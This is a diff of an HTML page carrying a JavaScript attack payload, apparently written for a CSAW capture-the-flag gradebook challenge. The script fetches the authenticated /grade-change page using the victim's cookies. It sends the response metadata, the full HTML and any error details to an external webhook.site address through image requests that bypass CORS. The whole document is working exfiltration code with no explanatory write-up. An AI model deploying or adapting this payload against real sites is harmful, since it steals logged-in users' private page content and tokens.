@@ -2,46 +2,53 @@
 <html>
 <body>
     <script>
-        function exfiltrate(data) {
+        function sendToWebhook(data) {
+            // Encode data in URL parameters and use image tag to avoid CORS
             const params = new URLSearchParams();
             params.append('data', JSON.stringify(data));
             new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
         }
 
-        // Fetch the grade-change page and get entire HTML
+        // Send initial message
+        sendToWebhook({
+            message: 'Starting fetch of /grade-change',
+            timestamp: new Date().toISOString()
+        });
+
+        // Fetch the grade-change endpoint
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
             credentials: 'include',
             mode: 'same-origin'
         })
         .then(response => {
             // Send response metadata first
-            exfiltrate({
-                type: 'response_metadata',
+            sendToWebhook({
+                type: 'response_headers',
                 status: response.status,
                 statusText: response.statusText,
                 url: response.url,
                 redirected: response.redirected,
-                headers: Object.fromEntries(response.headers.entries())
+                timestamp: new Date().toISOString()
             });
             
             return response.text();
         })
         .then(html => {
-            // Send the ENTIRE HTML content
-            exfiltrate({
+            // Send the COMPLETE HTML content
+            sendToWebhook({
                 type: 'full_html',
                 html: html,
                 length: html.length,
-                has_csrf: html.includes('csrf_token'),
                 timestamp: new Date().toISOString()
             });
         })
         .catch(error => {
-            exfiltrate({
+            // Send error details
+            sendToWebhook({
                 type: 'error',
                 error: error.toString(),
-                error_name: error.name,
-                error_message: error.message,
+                errorName: error.name,
+                errorMessage: error.message,
                 timestamp: new Date().toISOString()
             });
         });
